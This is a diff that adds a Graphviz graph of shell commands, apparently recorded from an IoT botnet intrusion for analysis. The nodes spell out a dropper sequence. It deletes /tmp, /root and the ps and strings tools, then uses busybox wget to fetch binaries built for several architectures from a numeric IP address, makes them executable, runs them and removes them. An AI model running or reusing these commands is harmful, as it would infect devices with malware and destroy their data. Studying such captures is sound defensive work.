@@ -1,0 +1,234 @@
+digraph {
+228 [label="rm -f * "];
+228 -> 228
+2 [label="busybox rm -rf /tmp/* "];
+2 -> 2
+4 [label="busybox rm -rf /root/* "];
+4 -> 4
+6 [label="busybox rm -rf /usr/bin/strings "];
+6 -> 6
+8 [label="busybox rm -rf /usr/bin/ps "];
+8 -> 8
+10 [label="busybox wget http://208.67.1.187/jackmymipsel "];
+10 -> 10
+12 [label="busybox chmod +x jackmymipsel "];
+12 -> 14 [label=";,"];
+14 [label="./jackmymipsel "];
+14 -> 16 [label=";,"];
+16 [label="busybox rm -f jackmymipsel* "];
+16 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+110 [label="busybox wget http://208.67.1.187/jackmymips "];
+110 -> 110
+22 [label="busybox chmod +x jackmymips "];
+22 -> 124 [label=";,"];
+124 [label="./jackmymips "];
+124 -> 126 [label=";,"];
+126 [label="busybox rm -f jackmymips* "];
+126 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+130 [label="busybox wget http://208.67.1.187/jackmysh4 "];
+130 -> 130
+32 [label="busybox chmod +x jackmysh4 "];
+32 -> 144 [label=";,"];
+144 [label="./jackmysh4 "];
+144 -> 146 [label=";,"];
+146 [label="busybox rm -f jackmysh4* "];
+146 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+150 [label="busybox wget http://208.67.1.187/jackmyx86 "];
+150 -> 150
+42 [label="busybox chmod +x jackmyx86 "];
+42 -> 164 [label=";,"];
+164 [label="./jackmyx86 "];
+164 -> 166 [label=";,"];
+166 [label="busybox rm -f jackmyx86* "];
+166 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+170 [label="busybox wget http://208.67.1.187/jackmyarmv6 "];
+170 -> 170
+52 [label="busybox chmod +x jackmyarmv6 "];
+52 -> 184 [label=";,"];
+184 [label="./jackmyarmv6 "];
+184 -> 186 [label=";,"];
+186 [label="busybox rm -f jackmyarmv6* "];
+186 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+190 [label="busybox wget http://208.67.1.187/jackmyi686 "];
+190 -> 190
+62 [label="busybox chmod +x jackmyi686 "];
+62 -> 204 [label=";,"];
+204 [label="./jackmyi686 "];
+204 -> 206 [label=";,"];
+206 [label="busybox rm -f jackmyi686* "];
+206 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+210 [label="busybox wget http://208.67.1.187/jackmypowerpc "];
+210 -> 210
+72 [label="busybox chmod +x jackmypowerpc "];
+72 -> 224 [label=";,"];
+224 [label="./jackmypowerpc "];
+224 -> 226 [label=";,"];
+226 [label="busybox rm -f jackmypowerpc* "];
+226 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+80 [label="busybox wget http://208.67.1.187/jackmyi586 "];
+80 -> 80
+82 [label="busybox chmod +x jackmyi586 "];
+82 -> 84 [label=";,"];
+84 [label="./jackmyi586 "];
+84 -> 86 [label=";,"];
+86 [label="busybox rm -f jackmyi586* "];
+86 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+90 [label="busybox wget http://208.67.1.187/xlegal1 "];
+90 -> 90
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 94 [label=";,"];
+94 [label="busybox cat xlegal1 busybox "];
+94 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+98 [label="busybox rm -f xlegal1 "];
+98 -> 100 [label=";,"];
+100 [label="busybox cp busybox xlegal1 "];
+100 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 104 [label=";,"];
+104 [label="./xlegal1 "];
+104 -> 106 [label=";,"];
+106 [label="busybox rm -f xlegal1* "];
+106 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+110 [label="busybox wget http://208.67.1.187/jackmymips "];
+110 -> 110
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 114 [label=";,"];
+114 [label="busybox cat jackmymips busybox "];
+114 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+118 [label="busybox rm -f jackmymips "];
+118 -> 120 [label=";,"];
+120 [label="busybox cp busybox jackmymips "];
+120 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 124 [label=";,"];
+124 [label="./jackmymips "];
+124 -> 126 [label=";,"];
+126 [label="busybox rm -f jackmymips* "];
+126 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+130 [label="busybox wget http://208.67.1.187/jackmysh4 "];
+130 -> 130
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 134 [label=";,"];
+134 [label="busybox cat jackmysh4 busybox "];
+134 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+138 [label="busybox rm -f jackmysh4 "];
+138 -> 140 [label=";,"];
+140 [label="busybox cp busybox jackmysh4 "];
+140 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 144 [label=";,"];
+144 [label="./jackmysh4 "];
+144 -> 146 [label=";,"];
+146 [label="busybox rm -f jackmysh4* "];
+146 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+150 [label="busybox wget http://208.67.1.187/jackmyx86 "];
+150 -> 150
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 154 [label=";,"];
+154 [label="busybox cat jackmyx86 busybox "];
+154 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+158 [label="busybox rm -f jackmyx86 "];
+158 -> 160 [label=";,"];
+160 [label="busybox cp busybox jackmyx86 "];
+160 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 164 [label=";,"];
+164 [label="./jackmyx86 "];
+164 -> 166 [label=";,"];
+166 [label="busybox rm -f jackmyx86* "];
+166 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+170 [label="busybox wget http://208.67.1.187/jackmyarmv6 "];
+170 -> 170
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 174 [label=";,"];
+174 [label="busybox cat jackmyarmv6 busybox "];
+174 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+178 [label="busybox rm -f jackmyarmv6 "];
+178 -> 180 [label=";,"];
+180 [label="busybox cp busybox jackmyarmv6 "];
+180 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 184 [label=";,"];
+184 [label="./jackmyarmv6 "];
+184 -> 186 [label=";,"];
+186 [label="busybox rm -f jackmyarmv6* "];
+186 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+190 [label="busybox wget http://208.67.1.187/jackmyi686 "];
+190 -> 190
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 194 [label=";,"];
+194 [label="busybox cat jackmyi686 busybox "];
+194 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+198 [label="busybox rm -f jackmyi686 "];
+198 -> 200 [label=";,"];
+200 [label="busybox cp busybox jackmyi686 "];
+200 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 204 [label=";,"];
+204 [label="./jackmyi686 "];
+204 -> 206 [label=";,"];
+206 [label="busybox rm -f jackmyi686* "];
+206 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+210 [label="busybox wget http://208.67.1.187/jackmypowerpc "];
+210 -> 210
+212 [label="busybox cp /bin/busybox ./ "];
+212 -> 214 [label=";,"];
+214 [label="busybox cat jackmypowerpc busybox "];
+214 -> 216 [label=";,"];
+216 [label="busybox "];
+216 -> 216
+218 [label="busybox rm -f jackmypowerpc "];
+218 -> 220 [label=";,"];
+220 [label="busybox cp busybox jackmypowerpc "];
+220 -> 222 [label=";,"];
+222 [label="busybox rm -f busybox "];
+222 -> 224 [label=";,"];
+224 [label="./jackmypowerpc "];
+224 -> 226 [label=";,"];
+226 [label="busybox rm -f jackmypowerpc* "];
+226 -> 228 [label=";,"];
+228 [label="rm -f * "];
+228 -> 228
+230 [label="sleep 1 "];
+230 -> 230
+}
